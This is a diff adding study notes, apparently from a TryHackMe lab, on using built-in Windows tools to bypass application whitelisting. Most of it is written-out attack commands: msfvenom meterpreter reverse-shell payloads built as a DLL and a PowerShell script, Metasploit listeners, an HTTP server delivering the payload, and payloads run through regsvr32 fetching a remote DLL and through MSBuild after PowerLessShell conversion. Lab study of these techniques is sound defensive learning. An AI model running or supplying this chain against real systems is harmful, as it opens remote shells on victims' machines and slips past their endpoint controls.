@@ -100,7 +100,60 @@ C:\Users\thm> rundll32.exe javasript:"\..\mshtml, RUNHTMLApplication";document.w
 
 Bypassing Application Whitelisting
 
+Application whitelisting: microsoft endpoint security feature that prevents malicious and unauthorized programs from executing in real-time
+-rule based, list of approved applications or executables
 
+Regsvr32
+-cmd line tool to register and unregister DLLs
+-location: C:\Windows\System32\regsvr32.exe - 32 bit
+-location: C:\Windows\SysWOW64\regsvr32.exe - 64 bit
+-can be used to execute arbitrary binaries and bypass windows application whitelisting
+-create a malicious DLL using msvenom
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f dll -a x86 > name.dll
+msfconsole -q
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST [IP]
+set LPORT [PORT]
+exploit
+-serve file
+python3 -m http.server [Port to serve malicious DLL]
+-get served file on target machine
+-use regsvr32.exe
+C:\Windows\System32\regsvr32.exe /s /n /u /i:http://[IP]/name.dll
 
+Bourne Again Shell (Bash)
+-Microsft added support for Linux env (Windows Subsystem for Linux - WSL)
+-WSL1 and WSL2 versions
+-WSL - Hyper-V virtualized Linux distribution that runs on the OS
+-bash.exe is a microsfot tool for interacting with the linux environment
+-can be used to execute payloads and bypass windows application whitelisting
+bash.exe -c calc.exe (T1202)
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Other techniques
+
+Shortcuts
+-symbolic links  used for referring to other files or application within the os
+-can be modified to execute other files (T1547)
+
+No Powershell
+-organization block powershell.exe due to malicious use
+-can run powershell without spawning
+-PowerLessShell - python-based tool that generates malicious code to run on a target machine without showing an instance of the Powershell process
+-uses Microsoft Build Engine (MSBuild)
+-download
+git clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git
+-generate powershell payload using msfvenom
+msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=PORT -f psh-reflection > liv0ff.ps1
+-listen using metasploit
+msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost AttackBox_IP;set lport PORT;exploit"
+-change powerLessShell directory project to convert payload to be compatible with MSBuild tool
+python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj
+-transfer output file to windows machine
+python3 -m http.server [IP]
+-run the .csproj file using MSBuild.exe
+C:\Users\thm> c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj
 
 
